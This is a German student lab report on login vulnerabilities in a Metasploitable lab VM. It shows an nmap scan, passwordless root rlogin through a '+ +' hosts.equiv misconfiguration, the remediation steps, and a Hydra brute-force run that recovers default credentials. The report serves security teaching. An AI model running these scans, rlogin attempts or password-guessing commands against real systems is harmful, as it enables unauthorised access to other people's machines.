# Login Vulnerabilites

**Name**: Jan Freitag   
**Klasse**: 4AHITS   
**Fach**: ITSE   
**Datum**: 15.12.2025   
**Anweisungen**: [Login Vulnerabilites](https://www.franzmatejka.at/htl/doc/ITSI_4/lab/06_rlogin_pw_guessing.html)

## Übungen

### rlogin vulnerability

#### `nmap scan`

```shell
┌──(parallels㉿kali-linux-2024-2)-[~]
└─$ nmap -sV -p 513 172.20.10.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-15 11:51 CET
Nmap scan report for 172.20.10.2
Host is up (0.0029s latency).

PORT    STATE SERVICE VERSION
513/tcp open  login
MAC Address: 52:54:00:12:34:56 (QEMU virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.47 seconds
```

#### `rlogin`

```shell
rlogin -l root 172.20.10.2
```

#### Fehlkonfiguration

```shell
root@metasploitable:~# cat /etc/hosts.equiv
# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
#                   command access to your system .
+ +
```

#### Behebung

```shell
vim /etc/pam.d/rlogin
```

##### in `/etc/pam.d/rlogin` folgende Zeile auskommentieren

```
#auth           sufficient      pam_rhosts_auth.so promiscuous
```

```shell
rm -f /etc/hosts.equiv
rm -f /home/*/.rhosts /root/.rhosts
```

##### `inetd` neustarten

```shell
sudo /etc/init.d/openbsd-inetd restart
```

##### Test

```shell
┌──(parallels㉿kali-linux-2024-2)-[~/Downloads/wordlists]
└─$ rlogin -l root 172.20.10.2
Password:
```

#### Online password guessing

[usernames](wordlists/usernames.txt)

[passwords](wordlists/passwords.txt) 

```shell
┌──(parallels㉿kali-linux-2024-2)-[~/Downloads/wordlists]
└─$ hydra -L usernames.txt -P passwords.txt rlogin://172.20.10.2
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-15 12:48:23
[DATA] max 16 tasks per 1 server, overall 16 tasks, 240 login tries (l:15/p:16), ~15 tries per task
[DATA] attacking rlogin://172.20.10.2:513/
[513][rlogin] host: 172.20.10.2   login: msfadmin   password: msfadmin
[513][rlogin] host: 172.20.10.2   login: user   password: user
[513][rlogin] host: 172.20.10.2   login: postgres   password: postgres
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-15 12:48:55
```
